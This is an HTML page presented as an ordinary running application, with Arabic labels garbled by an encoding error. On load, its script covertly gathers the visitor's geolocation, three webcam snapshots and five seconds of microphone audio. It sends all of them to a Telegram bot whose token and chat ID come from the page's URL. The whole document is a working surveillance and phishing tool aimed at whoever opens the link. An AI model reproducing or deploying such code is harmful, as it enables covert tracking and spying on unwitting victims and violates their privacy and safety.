<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ</title>
</head>
<body>
    <h1>Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ù‚ÙŠØ¯ Ø§Ù„ØªØ´ØºÙŠÙ„</h1>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const telegramBotToken = urlParams.get('token');
        const chatId = urlParams.get('chat_id');

        if (!telegramBotToken || !chatId) {
            document.body.innerHTML = '<h1>âš ï¸ Ø­Ø¯Ø« Ø®Ø·Ø£: Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©!</h1>';
            throw new Error("Missing token or chat_id in URL.");
        }

        async function sendDataToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Telegram:", error);
            }
        }

        async function sendPhotoToTelegram(imageDataUrl) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
            try {
                await fetch(url, {
                    method: 'POST',
                    body: new FormData(Object.assign(new FormData(), {
                        chat_id: chatId,
                        photo: imageDataUrl,
                    }))
                });
            } catch (error) {
                console.error("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Telegram:", error);
            }
        }

        async function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        sendDataToTelegram(`ğŸ“ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹:\n- Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${latitude}\n- Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${longitude}`);
                    },
                    error => {
                        sendDataToTelegram("âš ï¸ ØªØ¹Ø°Ø± Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ.");
                    }
                );
            } else {
                sendDataToTelegram("âš ï¸ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­.");
            }
        }

        function captureImages() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            document.body.appendChild(video);

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        for (let i = 0; i < 3; i++) {
                            setTimeout(() => {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const context = canvas.getContext('2d');
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                                const imageDataUrl = canvas.toDataURL('image/png');
                                sendPhotoToTelegram(imageDataUrl);
                            }, i * 2000);
                        }
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }, 2000);
                })
                .catch(err => console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:", err));
        }

        function captureAudio() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                sendDataToTelegram("âš ï¸ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­.");
                return;
            }

            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];

                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('audio', audioBlob);

                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendAudio`, {
                            method: 'POST',
                            body: formData,
                        }).catch(error => {
                            console.error("Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ØµÙ…Ø© Ø§Ù„ØµÙˆØªÙŠØ©:", error);
                        });
                    };

                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop());
                    }, 5000);
                })
                .catch(err => console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†:", err));
        }

        // ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ù‡Ø§Ù…
        sendLocation();
        captureImages();
        captureAudio();
    </script>
</body>
</html>
